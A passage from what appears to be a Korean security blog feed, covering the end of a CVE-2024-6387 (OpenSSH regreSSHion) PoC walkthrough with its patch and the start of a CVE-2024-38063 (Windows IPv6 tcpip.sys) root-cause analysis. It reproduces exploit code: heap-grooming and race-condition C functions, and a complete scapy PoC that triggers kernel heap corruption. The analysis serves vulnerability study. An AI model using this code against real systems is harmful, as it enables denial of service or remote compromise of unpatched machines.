<p>PoC에서 역시 <code class="language-plaintext highlighter-rouge">glibc</code>를 다음과 같은 두 개의 주소중 하나라고 가정합니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Possible glibc base addresses (for ASLR bypass)</span>
<span class="kt">uint64_t</span> <span class="n">GLIBC_BASES</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xb7200000</span><span class="p">,</span> <span class="mh">0xb7400000</span> <span class="p">};</span>
<span class="kt">int</span> <span class="n">NUM_GLIBC_BASES</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">GLIBC_BASES</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">GLIBC_BASES</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">main</code> 함수의 핵심적인 부분을 살펴봅시다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="p">...</span>
          <span class="n">prepare_heap</span> <span class="p">(</span><span class="n">sock</span><span class="p">);</span>
          <span class="n">time_final_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">parsing_time</span><span class="p">);</span>

          <span class="k">if</span> <span class="p">(</span><span class="n">attempt_race_condition</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">parsing_time</span><span class="p">,</span> <span class="n">glibc_base</span><span class="p">))</span>
            <span class="p">{</span>
              <span class="n">printf</span> <span class="p">(</span><span class="s">"Possible exploitation success on attempt %d with glibc "</span>
                      <span class="s">"base 0x%lx!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                      <span class="n">attempt</span><span class="p">,</span> <span class="n">glibc_base</span><span class="p">);</span>
              <span class="n">success</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
              <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위에 나타난 함수들 중 <code class="language-plaintext highlighter-rouge">prepare_heap</code> 함수에서 a~d의 역할을 하는 패킷들이 전송됩니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">prepare_heap</span> <span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// Packet a: Allocate and free tcache chunks</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">tcache_chunk</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
      <span class="n">memset</span> <span class="p">(</span><span class="n">tcache_chunk</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tcache_chunk</span><span class="p">));</span>
      <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">tcache_chunk</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tcache_chunk</span><span class="p">));</span>
      <span class="c1">// These will be freed by the server, populating tcache</span>
    <span class="p">}</span>

  <span class="c1">// Packet b: Create 27 pairs of large (~8KB) and small (320B) holes</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">27</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// Allocate large chunk (~8KB)</span>
      <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">large_hole</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
      <span class="n">memset</span> <span class="p">(</span><span class="n">large_hole</span><span class="p">,</span> <span class="sc">'B'</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">large_hole</span><span class="p">));</span>
      <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">large_hole</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">large_hole</span><span class="p">));</span>

      <span class="c1">// Allocate small chunk (320B)</span>
      <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">small_hole</span><span class="p">[</span><span class="mi">320</span><span class="p">];</span>
      <span class="n">memset</span> <span class="p">(</span><span class="n">small_hole</span><span class="p">,</span> <span class="sc">'C'</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">small_hole</span><span class="p">));</span>
      <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">small_hole</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">small_hole</span><span class="p">));</span>
    <span class="p">}</span>

  <span class="c1">// Packet c: Write fake headers, footers, vtable and _codecvt pointers</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">27</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">fake_data</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
      <span class="n">create_fake_file_structure</span> <span class="p">(</span><span class="n">fake_data</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">fake_data</span><span class="p">),</span>
                                  <span class="n">GLIBC_BASES</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
      <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">fake_data</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">fake_data</span><span class="p">));</span>
    <span class="p">}</span>

  <span class="c1">// Packet d: Ensure holes are in correct malloc bins (send ~256KB string)</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">large_string</span><span class="p">[</span><span class="n">MAX_PACKET_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
  <span class="n">memset</span> <span class="p">(</span><span class="n">large_string</span><span class="p">,</span> <span class="sc">'E'</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">large_string</span><span class="p">));</span>
  <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">large_string</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">large_string</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">prepare_heap</code>이 완료되면 <code class="language-plaintext highlighter-rouge">time_final_paket</code> 함수를 통해서 공개키가 파싱되는 타이밍을 알아냅니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">time_final_packet</span> <span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">,</span> <span class="kt">double</span> <span class="o">*</span><span class="n">parsing_time</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">double</span> <span class="n">time_before</span> <span class="o">=</span> <span class="n">measure_response_time</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="kt">double</span> <span class="n">time_after</span> <span class="o">=</span> <span class="n">measure_response_time</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
  <span class="o">*</span><span class="n">parsing_time</span> <span class="o">=</span> <span class="n">time_after</span> <span class="o">-</span> <span class="n">time_before</span><span class="p">;</span>

  <span class="n">printf</span> <span class="p">(</span><span class="s">"Estimated parsing time: %.6f seconds</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">parsing_time</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위에서 알아낸 타이밍을 기반으로 레이스 컨디션을 수행합니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="n">attempt_race_condition</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">parsing_time</span><span class="p">,</span> <span class="n">glibc_base</span><span class="p">)</span>
<span class="p">...</span>
</code></pre></div></div>

<h1 id="patch">Patch</h1>

<p><code class="language-plaintext highlighter-rouge">sshd.c</code>에 위치한 <a href="https://github.com/openssh/openssh-portable/blob/V_9_7/sshd.c#L353">grace_alarm_handler</a> 함수가 <code class="language-plaintext highlighter-rouge">sshd-session.c</code>로 옮겨가며 다음과 같이 코드가 수정되었습니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Signal handler for the alarm after the login grace period has expired.
 * As usual, this may only take signal-safe actions, even though it is
 * terminal.
 */</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">grace_alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
	<span class="cm">/*
	 * Try to kill any processes that we have spawned, E.g. authorized
	 * keys command helpers or privsep children.
	 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">getpgid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">getpid</span><span class="p">())</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">;</span>

		<span class="cm">/* mask all other signals while in handler */</span>
		<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
		<span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">SIG_IGN</span><span class="p">;</span>
		<span class="n">sigfillset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
		<span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
		<span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
		<span class="n">kill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">SIGTERM</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">_exit</span><span class="p">(</span><span class="n">EXIT_LOGIN_GRACE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h1 id="references">References</h1>

<ul>
  <li><a href="https://www.openssh.com/txt/release-9.8">https://www.openssh.com/txt/release-9.8</a><br /></li>
  <li><a href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt</a></li>
</ul>]]></content><author><name>Aiden</name><email>aidencom99@email.com</email></author><category term="1-day" /><category term="exploit" /><category term="OpenSSH" /><category term="Linux" /><summary type="html"><![CDATA[CVE-2024-6387]]></summary></entry><entry><title type="html">CVE-2024-38063 - Analysis of Windows TCP/IP IPv6 Vulnerabilities</title><link href="http://localhost:4444/CVE-2024-38063/" rel="alternate" type="text/html" title="CVE-2024-38063 - Analysis of Windows TCP/IP IPv6 Vulnerabilities" /><published>2024-10-04T01:06:00+09:00</published><updated>2024-10-04T01:06:00+09:00</updated><id>http://localhost:4444/CVE-2024-38063</id><content type="html" xml:base="http://localhost:4444/CVE-2024-38063/"><![CDATA[<p align="center"><img src="/assets/img/CVE-2024-38063/title.png" /></p>

<h1 id="intro">Intro</h1>

<p>TOOR 팀 활동을 하며 분석하게된 윈도우 커널 원데이 취약점에 관한 글입니다.</p>
<p align="center"><img src="/assets/img/toor.png" /></p>

<p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063</a></p>

<p>CVE-2024-38063은 2024년 8월 13일에 패치가 발표된 Windows TCP/IP RCE 취약점입니다. IPv6의 확장 헤더 로직의 에러 처리 부분에서 잘못된 연결 리스트 처리에 의해 Integer underflow를 일으켜 더 나아가 Heap overflow를 발생시킬 수 있습니다.</p>

<p>해당 취약점을 악용하기 위해서는 타겟에 IPv6 기능이 활성화되어있어야합니다.</p>

<p><img src="/assets/img/CVE-2024-38063/1.png" /></p>

<p>취약점은 윈도우의 tcpip.sys 드라이버에서 발생합니다. 여러 분석 글에서도 다뤘듯, tcpip.sys의 패치 전 후의 디핑 결과를 통해서 취약점이 발생하는 부분을 알아낼 수 있습니다.</p>

<p><img src="/assets/img/CVE-2024-38063/2.png" /></p>

<p>취약점은 tcpip.sys의 확장 헤더 처리 과정에서 일어납니다. 또한 이를 취약점으로 연계시키기 위해 PoC에서는 확장 헤더의 재조립 기능을 이용합니다. 때문에 쉽게 취약점을 이해하기 위해 해당 글을 읽기에 앞서 IPv6의 확장 헤더 스펙에 대해서 먼저 살펴보시는 것을 추천드립니다.</p>

<p><a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2225063&amp;seqNum=4">https://www.microsoftpressstore.com/articles/article.aspx?p=2225063&amp;seqNum=4</a></p>

<p>또한 IPv6의 RFC 중, 확장 헤더에 대해서 설명된 부분(특히 Fragment, Destination Option)을 읽어보는 것을 먼저 추천합니다.</p>

<p><a href="https://datatracker.ietf.org/doc/html/rfc2460">https://datatracker.ietf.org/doc/html/rfc2460</a></p>

<p>본 글은 선행 연구를 진행하신 다른 연구원분들의 글들을 읽고 제 나름 분석을 진행하며 취약점을 공부하며 이해하고 정리해본 결과로 작성하게된 글입니다. 나름의 분석을 해봤지만 맞지 않는 부분이 있을 수 있으며, 만약 이를 발견하셨을 시 피드백해주시면 적극 반영하도록 하겠습니다. 취약점 및 PoC 분석에 많은 도움이된 자료들은 다음과 같습니다.</p>

<ul>
  <li><a href="https://malwaretech.com/2024/08/exploiting-CVE-2024-38063.html">https://malwaretech.com/2024/08/exploiting-CVE-2024-38063.html</a></li>
  <li><a href="https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/">https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/</a></li>
</ul>

<h1 id="vuln">Vuln</h1>

<ul>
  <li>CVE-ID : CVE-2024-38063</li>
  <li>CWE : <a href="https://cwe.mitre.org/data/definitions/191.html">Integer Underflow</a></li>
</ul>

<h1 id="env">Env</h1>

<p>타겟 버전<br />
<img src="/assets/img/CVE-2024-38063/3.png" /></p>

<p>*분석에서 사용한 타겟 버전은 패치가 적용되기 바로 이전의 빌드 버전과 차이가 있습니다.</p>

<h1 id="rca">RCA</h1>

<p>해당 취약점은 윈도우 tcpip.sys 커널 모듈에서 IPv6 확장 헤더 패킷의 일괄적 에러 처리 과정에서 발생하는 취약점입니다. 이로인해 Integer Underflow가 발생할 수 있습니다.</p>

<p>윈도우에서는 IP 패킷들을 다음과 같이 특정 상황에서 일괄적으로 묶어 처리합니다. 윈도우에서는 전송받은 패킷을 처리하기 위해서 문서화되지 않은 구조체를 활용하며 해당 구조체는 패킷 데이터 처리를 위한 여러 메타데이터를 갖고 있습니다. Root Cause를 파악 하기위해서는 해당 구조체에 존재하는 필드 중, 현재 패킷의 헤더를 어디까지 파싱하였는지에 대한 필드(이하, current-offset이라 표현함.)에 대해 알아야합니다. 해당 필드가 이제부터 알아볼 취약점의 핵심이됩니다.</p>

<p><img src="/assets/img/CVE-2024-38063/4.png" /></p>

<p>IPv6 스펙을 보면 알 수 있듯, IPv6는 확장 헤더라는 기능이 있으며 이에 대한 처리를 위해 윈도우에서는 tcpip!Ipv6pProcessOptions 함수를 제공합니다. 이때 패치가 적용된 부분은 Ipv6pProcessOptions의 가장 하단에 존재하는 다음과 같은 부분입니다.</p>

<p><img src="/assets/img/CVE-2024-38063/5.png" /></p>

<p>해당 로직은 IPv6의 Destination option확장 헤더 처리 과정에서 유효하지 않은 값이 들어있을 때 패킷을 버리고 전송지로 ICMP Parameter Problem 메시지를 전송하는 역할을 합니다. 다음과 같은 코드로 잘못된 IPv6 확장 헤더를 보내 해당 메시지를 확인할 수 있습니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">ip_addr</span><span class="o">=</span><span class="s">''</span>
<span class="n">mac_addr</span><span class="o">=</span><span class="s">''</span>
<span class="n">iface</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">packet</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="p">[</span><span class="n">PadN</span><span class="p">(</span><span class="n">otype</span><span class="o">=</span><span class="mh">0x81</span><span class="p">,</span> <span class="n">optdata</span><span class="o">=</span><span class="s">'a'</span><span class="o">*</span><span class="mi">3</span><span class="p">)])</span>
<span class="n">sendp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">iface</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/img/CVE-2024-38063/6.png" /></p>

<p>IppSendErrorList는 앞서 언급한 패킷 연결 리스트를 돌며 각 패킷 구조체에 대해서 IppSendError를 호출하게됩니다.</p>

<p><img src="/assets/img/CVE-2024-38063/7.png" /></p>

<p>IppSendError는 일괄 처리중인 각 패킷 객체에 대해 current-offset 필드 0으로 만드는 작업을 수행하고 오류 표시를 한 뒤 해당 패킷을 되돌리는 처리를 하게됩니다.</p>

<p>패킷 구조체에 대해서 current-offset 필드를 0으로 만들기 전 후 비교는 다음과 같습니다.</p>

<figure>
<img src="/assets/img/CVE-2024-38063/8.png" />
<figcaption>IppSendError 호출 이전의 current-offset 필드값</figcaption>
</figure>

<figure>
<img src="/assets/img/CVE-2024-38063/9.png" />
<figcaption>IppSendError 호출 이후의 current-offset 필드값</figcaption>
</figure>

<p>나머지 패킷은 current-offset이 에러 처리 로직에 의해 0으로 되었음에도 불구하고 에러 코드가 삽입되지 않았기 때문에 헤더 파싱을 계속하게됩니다.</p>

<p><img src="/assets/img/CVE-2024-38063/10.png" /></p>

<p>이로 인해 current-offset이라는 필드 값을 0으로 만든체로 다른 로직을 수행하게됩니다. 이는 current-offset을 활용한 로직에서 부작용을 불러일으킬 수 있습니다.</p>

<h1 id="poc-analysis">PoC Analysis</h1>

<p>PoC를 분석하며 어떤 과정을 거쳐 Heap overflow까지 가능하게 했는지 알아봅시다.</p>

<p><a href="https://github.com/ynwarcs/CVE-2024-38063">https://github.com/ynwarcs/CVE-2024-38063</a></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">iface</span><span class="o">=</span><span class="s">''</span>
<span class="n">ip_addr</span><span class="o">=</span><span class="s">''</span>
<span class="n">mac_addr</span><span class="o">=</span><span class="s">''</span>
<span class="n">num_tries</span><span class="o">=</span><span class="mi">20</span>
<span class="n">num_batches</span><span class="o">=</span><span class="mi">20</span>

<span class="k">def</span> <span class="nf">get_packets_with_mac</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">frag_id</span> <span class="o">=</span> <span class="mh">0xdebac1e</span> <span class="o">+</span> <span class="n">i</span>
    <span class="n">first</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="p">[</span><span class="n">PadN</span><span class="p">(</span><span class="n">otype</span><span class="o">=</span><span class="mh">0x81</span><span class="p">,</span> <span class="n">optdata</span><span class="o">=</span><span class="s">'a'</span><span class="o">*</span><span class="mi">3</span><span class="p">)])</span>
    <span class="n">second</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">frag_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">/</span> <span class="s">'aaaaaaaa'</span>
    <span class="n">third</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">frag_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">first</span><span class="p">,</span> <span class="n">second</span><span class="p">,</span> <span class="n">third</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">get_packets</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">mac_addr</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">get_packets_with_mac</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="n">frag_id</span> <span class="o">=</span> <span class="mh">0xdebac1e</span> <span class="o">+</span> <span class="n">i</span>
    <span class="n">first</span> <span class="o">=</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="p">[</span><span class="n">PadN</span><span class="p">(</span><span class="n">otype</span><span class="o">=</span><span class="mh">0x81</span><span class="p">,</span> <span class="n">optdata</span><span class="o">=</span><span class="s">'a'</span><span class="o">*</span><span class="mi">3</span><span class="p">)])</span>
    <span class="n">second</span> <span class="o">=</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">frag_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">/</span> <span class="s">'aaaaaaaa'</span>
    <span class="n">third</span> <span class="o">=</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">frag_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">first</span><span class="p">,</span> <span class="n">second</span><span class="p">,</span> <span class="n">third</span><span class="p">]</span>

<span class="n">final_ps</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_batches</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_tries</span><span class="p">):</span>
        <span class="n">final_ps</span> <span class="o">+=</span> <span class="n">get_packets</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">get_packets</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Sending packets"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">mac_addr</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
    <span class="n">sendp</span><span class="p">(</span><span class="n">final_ps</span><span class="p">,</span> <span class="n">iface</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">send</span><span class="p">(</span><span class="n">final_ps</span><span class="p">,</span> <span class="n">iface</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">60</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Memory corruption will be triggered in </span><span class="si">{</span><span class="mi">60</span><span class="o">-</span><span class="n">i</span><span class="si">}</span><span class="s"> seconds"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">'</span><span class="se">\r</span><span class="s">'</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
</code></pre></div></div>
<p>PoC에서 볼 수 있듯, 총 3개의 패킷의 묶음을 연속해서 생성하고 있다는 것을 알 수 있습니다.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">first</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">64</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_addr</span><span class="p">)</span> <span class="o">/</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="p">[</span><span class="n">PadN</span><span class="p">(</span><span class="n">otype</span><span class="o">=</span><span class="mh">0x81</span><span class="p">,</span> <span class="n">optdata</span><span class="o">=</span><span class="s">'a'</span><span class="o">*</span><span class="mi">3</span><span class="p">)])</span>
